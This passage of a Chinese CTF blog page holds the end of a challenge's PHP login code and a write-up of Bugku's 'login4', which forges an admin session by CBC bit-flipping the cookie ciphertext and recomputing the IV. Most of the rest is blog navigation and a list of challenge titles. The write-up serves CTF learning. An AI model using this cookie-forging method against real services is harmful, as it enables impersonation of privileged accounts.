if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>这题和实验吧那题还是有些不同，不过也没什么<br>大概就是如果有post用户名和密码过去就查session中有没有用户名，不然就报错。当登录使用用户名为admin时会提示admin不能用，但在session中读到admin时才会给出flag。然后再看看其他部分，在用admin外的字符登录时，随机生成16位iv，再将用户名和密码序列化作为plain和iv进行cbc加密获得cipher。当刷新时会查cookie中的iv和cipher，用这两个来解密获得序列化的用户名和密码，最终取出用户名判断<br>接着要做什么就很明显了，就是通过修改cookie中的iv和plain把序列化出来的用户名修改成admin就行<br>这题最重要的地方就是cbc加密</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/4508c753820543ff1aefdd2afde58c2d.png" alt=""></p>
+<p>这张图就解释了原理，先将字符串截成每16字符位一块，然后传入iv和第一块进行异或运算，得出的结果再和第二块异或，就这样把整个字符串加密<br>这题要用到异或的一个特点：A^B=C,C^B=A<br>我们可以构造数据：{‘username’:’2dmin’,’password’:’22222’}，然后我们会得到返回的iv和cipher。<br>此时反序列化的数据，在16字符分隔后为</p>
+<p><img src="http://shifeng-kaze.cn/blog/bugku_web_wp/c8cfcc1334c7ff1f2b25880100014ba3.png" alt=""></p>
+<p>可以看到，2在第二行第10位，于是2是由第一行第十位进行加密的<br>于是将cipher以16字符分隔后，我们可以用(第十位加密后的值)^2^a将2dmin修改成admin。然后修改了cipher后iv也要改，不然无法反序列化。于是将旧iv和新cipher提交，获得报错的数据<br>我们知道：<br>new_cipher^new_iv = new_data<br>new_cipher^old_iv = error_data<br>于是：<br>new_iv = old_iv^error_data^new_data，new_data就是新的序列化数据（就上面2改成a）<br>通过这个获得新iv，接着再次提交新iv和新cipher获得flag</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/29/在github上搭建hexo博客/" rel="next" title="在github上搭建hexo博客">
+                <i class="fa fa-chevron-left"></i> 在github上搭建hexo博客
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/02/03/bugku-代码审计-wp/" rel="prev" title="bugku 代码审计 wp">
+                bugku 代码审计 wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="http://shifeng-kaze.cn/blog/head/kotori.jpg" alt="k0t0r1">
+            
+              <p class="site-author-name" itemprop="name">k0t0r1</p>
+              <p class="site-description motion-element" itemprop="description">～いらっしゃいません～</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://shifeng-kaze.cn/" title="shifeng-kaze" target="_blank">shifeng-kaze</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://aluvion.github.io" title="Aluvion" target="_blank">Aluvion</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web2"><span class="nav-number">1.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web基础-GET"><span class="nav-number">2.</span> <span class="nav-text">web基础$_GET</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#计算器"><span class="nav-number">3.</span> <span class="nav-text">计算器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web基础-POST"><span class="nav-number">4.</span> <span class="nav-text">web基础$_POST</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#矛盾"><span class="nav-number">5.</span> <span class="nav-text">矛盾</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3"><span class="nav-number">6.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#域名解析"><span class="nav-number">7.</span> <span class="nav-text">域名解析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#管理员系统"><span class="nav-number">8.</span> <span class="nav-text">管理员系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#你必须让他停下"><span class="nav-number">9.</span> <span class="nav-text">你必须让他停下</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#本地包含"><span class="nav-number">10.</span> <span class="nav-text">本地包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#变量1"><span class="nav-number">11.</span> <span class="nav-text">变量1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web5"><span class="nav-number">12.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#头等舱"><span class="nav-number">13.</span> <span class="nav-text">头等舱</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网站被黑"><span class="nav-number">14.</span> <span class="nav-text">网站被黑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web4"><span class="nav-number">15.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag在index里"><span class="nav-number">16.</span> <span class="nav-text">flag在index里</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#点击一百万次"><span class="nav-number">17.</span> <span class="nav-text">点击一百万次</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#输入密码查看flag"><span class="nav-number">18.</span> <span class="nav-text">输入密码查看flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#备份是个好习惯"><span class="nav-number">19.</span> <span class="nav-text">备份是个好习惯</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#成绩单"><span class="nav-number">20.</span> <span class="nav-text">成绩单</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#秋名山老司机"><span class="nav-number">21.</span> <span class="nav-text">秋名山老司机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#速度要快"><span class="nav-number">22.</span> <span class="nav-text">速度要快</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie欺骗"><span class="nav-number">23.</span> <span class="nav-text">cookie欺骗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#never-give-up"><span class="nav-number">24.</span> <span class="nav-text">never give up</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#welcome-to-bugkuctf"><span class="nav-number">25.</span> <span class="nav-text">welcome to bugkuctf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过狗一句话"><span class="nav-number">26.</span> <span class="nav-text">过狗一句话</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#字符？正则？"><span class="nav-number">27.</span> <span class="nav-text">字符？正则？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前女友-SKCTF"><span class="nav-number">28.</span> <span class="nav-text">前女友(SKCTF)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login1-SKCTF"><span class="nav-number">29.</span> <span class="nav-text">login1(SKCTF)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#你从哪里来"><span class="nav-number">30.</span> <span class="nav-text">你从哪里来</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#md5-collision-NUPT-CTF"><span class="nav-number">31.</span> <span class="nav-text">md5 collision(NUPT_CTF)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序员本地网站"><span class="nav-number">32.</span> <span class="nav-text">程序员本地网站</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#各种绕过"><span class="nav-number">33.</span> <span class="nav-text">各种绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web8"><span class="nav-number">34.</span> <span class="nav-text">web8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#细心"><span class="nav-number">35.</span> <span class="nav-text">细心</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#求getshell"><span class="nav-number">36.</span> <span class="nav-text">求getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#insert-into注入"><span class="nav-number">37.</span> <span class="nav-text">insert into注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这是一个神奇的登陆框"><span class="nav-number">38.</span> <span class="nav-text">这是一个神奇的登陆框</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多次"><span class="nav-number">39.</span> <span class="nav-text">多次</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-encrypt-1-ISCCCTF"><span class="nav-number">40.</span> <span class="nav-text">PHP_encrypt_1(ISCCCTF)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含2"><span class="nav-number">41.</span> <span class="nav-text">文件包含2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag-php"><span class="nav-number">42.</span> <span class="nav-text">flag.php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入2"><span class="nav-number">43.</span> <span class="nav-text">sql注入2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#孙xx的博客"><span class="nav-number">44.</span> <span class="nav-text">孙xx的博客</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入"><span class="nav-number">45.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Trim的日记本"><span class="nav-number">46.</span> <span class="nav-text">Trim的日记本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login2-SKCTF"><span class="nav-number">47.</span> <span class="nav-text">login2(SKCTF)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login3-SKCTF"><span class="nav-number">48.</span> <span class="nav-text">login3(SKCTF)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件上传2-湖湘杯"><span class="nav-number">49.</span> <span class="nav-text">文件上传2(湖湘杯)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login4"><span class="nav-number">50.</span> <span class="nav-text">login4</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">k0t0r1</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
